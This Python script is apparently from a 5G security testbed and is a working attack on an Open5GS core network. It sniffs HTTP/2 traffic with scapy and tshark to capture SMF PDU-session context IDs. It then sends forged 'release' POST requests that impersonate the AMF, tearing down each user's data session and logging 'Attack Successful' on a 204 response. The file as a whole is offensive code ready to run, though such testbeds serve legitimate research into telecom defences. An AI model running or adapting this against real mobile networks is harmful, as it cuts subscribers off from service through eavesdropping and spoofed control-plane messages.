#!/usr/bin/env python3

import logging
from scapy.all import sniff, wrpcap
from scapy.layers.inet import IP, TCP
import os
import subprocess
import time
import re

# Configure logging
logging.basicConfig(filename='/tmp/attack.log',
                    level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

URI_PATTERN = "http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/"
TEMP_PCAP = "/tmp/temp_packet.pcap"
TSHARK_CMD = [
    "tshark",
    "-r",
    TEMP_PCAP,  # Read from the temporary pcap
    "-o",
    "http2.tcp.port:80",  # Decode HTTP/2 on port 80
    "-Y",
    f'http2.header.value contains "{URI_PATTERN}"',  # Filter packets
    "-T",
    "fields",  # Output fields
    "-e",
    "ip.src",  # Extract source IP
    "-e",
    "http2.header.value",  # Extract header value
]
ATTACKED_UES = []


def process_with_tshark(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        try:
            # Write the packet to a temporary .pcap file
            wrpcap(TEMP_PCAP, [packet])

            output = subprocess.check_output(TSHARK_CMD).decode("utf-8")

            # Process tshark output
            for line in output.strip().split("\n"):
                parts = line.split("\t")
                if len(parts) >= 2:
                    ip_src = parts[0]
                    uriop = parts[1]
                    match = re.search(r'https?://[^\s,]+', uriop)
                    if match:
                        uri = match.group(0)
                        session_id = uri.split("/")[-1]
                        if session_id not in ATTACKED_UES:
                            ATTACKED_UES.append(session_id)
                            logging.info(f"URI: {uri}")
                            logging.info(f"Session ID: {session_id}")
                            post_to_server(ip_src, session_id)

        except subprocess.CalledProcessError as e:
            pass
            # logging.warning(
            #     f"Tshark processing error: {e.output.decode('utf-8')}")
        except Exception as e:
            pass
            # logging.warning(f"Error processing packet with tshark: {e}")
        finally:
            # Clean up the temporary .pcap file
            if os.path.exists(TEMP_PCAP):
                os.remove(TEMP_PCAP)


def post_to_server(ip_src, session_id):
    try:
        url = "http://{}/nsmf-pdusession/v1/sm-contexts/{}/release".format(
            os.getenv("OPEN5GS_SMF_PORT_80_TCP_ADDR"), session_id)
        data = '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}'
        headers = {"Content-Type": "application/json", "User-Agent": "AMF"}
        # Run the curl command and capture the HTTP response code
        result = subprocess.run(
            [
                "curl",
                "-s",
                "-o",
                "/dev/null",
                "-w",
                "%{http_code}",  # Only get the HTTP response code
                "--http2-prior-knowledge",
                "--request",
                "POST",
                "-d",
                data,
                "-H",
                f"Content-Type: {headers['Content-Type']}",
                "-A",
                headers["User-Agent"],
                url,
            ],
            text=True,
            capture_output=True,
            check=True,
        )

        response_code = result.stdout.strip()
        if response_code == "204":
            logging.info(f"Attack Successful for User-ID {session_id}")
        else:
            logging.info(
                f"Attack failed with response code {response_code} for User-ID {session_id}"
            )

    except subprocess.CalledProcessError as e:
        pass
        # logging.warning(f"Error sending POST request: {e}")
    except Exception as e:
        pass
        # logging.warning(f"Unexpected error: {e}")


def run(attack_enabled=False):
    # Start sniffing packets
    if attack_enabled == "true":
        logging.info("Starting traffic eavesdropping...")
        sniff(iface=os.listdir('/sys/class/net/'),
              filter="tcp src port 80",
              prn=process_with_tshark)
    else:
        logging.info("Not carrying out the attack.")
        while True:
            time.sleep(1)


if __name__ == "__main__":
    from sys import argv

    run(attack_enabled=str(argv[1]))
